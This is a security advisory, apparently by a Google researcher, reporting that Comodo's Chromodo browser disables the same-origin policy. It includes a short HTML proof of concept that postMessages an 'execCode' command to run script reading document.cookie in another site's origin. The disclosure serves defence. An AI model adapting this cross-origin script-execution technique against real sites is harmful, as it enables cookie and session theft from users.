# Comodo "Chromodo" Browser disables same origin policy, Effectively turning off web security

> Reported by taviso@google.com, Jan 22 2016

When you install Comodo Internet Security, by default a new browser called Chromodo is installed and set as the default browser. Additionally, all shortcuts are replaced with Chromodo links and all settings, cookies, etc are imported from Chrome. They also hijack DNS settings, among other shady practices.

Chromodo is described as "highest levels of speed, security and privacy", but actually disables all web security. Let me repeat that, they **_disable the same origin policy_**.... ?!?..

To reproduce, do something like this:

```html
<html>
    <head></head>
    <body>

        <script>
            function steal_cookie(obj) {
                // Wait for the page to load
                setTimeout(function() {
                    obj.postMessage(JSON.stringify({
                        command: "execCode",
                        code:    "alert(document.cookie)",
                    }), "*");
                }, 2000);
            }
        </script>

        <a href="javascript:steal_cookie(window.open('https://ssl.comodo.com/'))">
            Click Here
        </a>

    </body>
</html>
```
